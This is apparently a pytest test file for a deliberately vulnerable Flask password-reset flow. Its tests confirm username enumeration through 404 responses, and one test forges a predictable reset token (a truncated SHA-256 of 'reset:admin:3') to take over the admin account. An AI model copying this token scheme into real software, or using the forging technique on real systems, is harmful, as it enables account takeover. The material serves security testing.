import pytest


@pytest.fixture
def app():
    from app import create_app, db
    from app.core.models import User
    from werkzeug.security import generate_password_hash

    application = create_app(config_object="config.TestConfig")
    application.config["TESTING"] = True

    with application.app_context():
        db.drop_all()
        db.create_all()
        db.session.add(User(id=3, username="admin", email="admin@test.local",
                             password_hash=generate_password_hash("ChangeMe_Admin!2024"), role="admin"))
        db.session.commit()
        yield application


@pytest.fixture
def client(app):
    return app.test_client()


def test_forgot_password_confirms_existing_username(client):
    resp = client.post("/forgot-password", json={"username": "admin"})
    assert resp.status_code == 200


def test_forgot_password_reveals_nonexistent_username(client):
    resp = client.post("/forgot-password", json={"username": "nobody_here"})
    assert resp.status_code == 404


def test_weak_token_allows_password_reset_without_email_access(client):
    import hashlib
    # attacker computes this independently -- no email, no secret needed
    token = hashlib.sha256(b"reset:admin:3").hexdigest()[:16]

    resp = client.post("/reset-password", json={
        "username": "admin", "token": token, "new_password": "Hacked123!",
    })
    assert resp.status_code == 200

    login_resp = client.post("/login", data={"username": "admin", "password": "Hacked123!"}, follow_redirects=True)
    assert login_resp.status_code == 200


def test_wrong_token_rejected(client):
    resp = client.post("/reset-password", json={
        "username": "admin", "token": "wrong-token", "new_password": "Hacked123!",
    })
    assert resp.status_code == 400
